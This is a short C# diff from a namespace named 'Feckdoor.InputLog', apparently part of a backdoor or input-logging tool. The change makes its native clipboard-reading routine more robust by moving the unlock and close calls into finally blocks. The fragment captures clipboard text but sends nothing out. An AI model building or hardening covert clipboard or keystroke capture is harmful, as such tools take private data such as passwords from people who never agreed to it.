@@ -49,16 +49,32 @@ namespace Feckdoor.InputLog
 					string? clipString = null;
 					if (clipHandle != IntPtr.Zero)
 					{
-						clipString = new string((char*)Kernel32.GlobalLock(clipHandle));
-						Kernel32.GlobalUnlock(clipHandle);
+						try
+						{
+							clipString = new string((char*)Kernel32.GlobalLock(clipHandle));
+						}
+						finally
+						{
+							Kernel32.GlobalUnlock(clipHandle);
+						}
 					}
-					User32.CloseClipboard();
 					return clipString;
 				}
 			}
 			catch (Exception e)
 			{
 				Log.Warning(e, "Exception during native clipboard access.");
+			}
+			finally
+			{
+				try
+				{
+					User32.CloseClipboard();
+				}
+				catch (Exception e)
+				{
+					Log.Error(e, "Exception during closing the clipboard.");
+				}
 			}
 
 			return null;
